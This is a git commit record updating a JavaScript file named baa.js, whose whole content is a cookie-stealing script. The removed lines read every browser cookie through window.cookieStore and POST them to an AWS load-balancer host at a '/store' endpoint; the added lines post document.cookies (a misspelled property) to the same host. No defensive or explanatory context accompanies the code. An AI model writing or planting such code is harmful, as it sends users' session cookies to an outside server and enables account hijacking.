29cf3f1f2f76bbf6bef710c4926e923eca423505
yonatan braude <yonatan.py@gmail.com>
2024-05-27 15:50:43 +0300

    Update baa.js

--- baa.js
+++ baa.js
@@ -1,8 +1,4 @@
-window.cookieStore.getAll().then(
-  (cookies) => {
-    fetch("http://test-loadbalancer-1521445412.us-west-2.elb.amazonaws.com/store", {
-      method: "POST", 
-      body: JSON.stringify(cookies),
-    })
-  }
-)
+fetch("http://test-loadbalancer-1521445412.us-west-2.elb.amazonaws.com/store", {
+    method: "POST", 
+    body: document.cookies,
+})
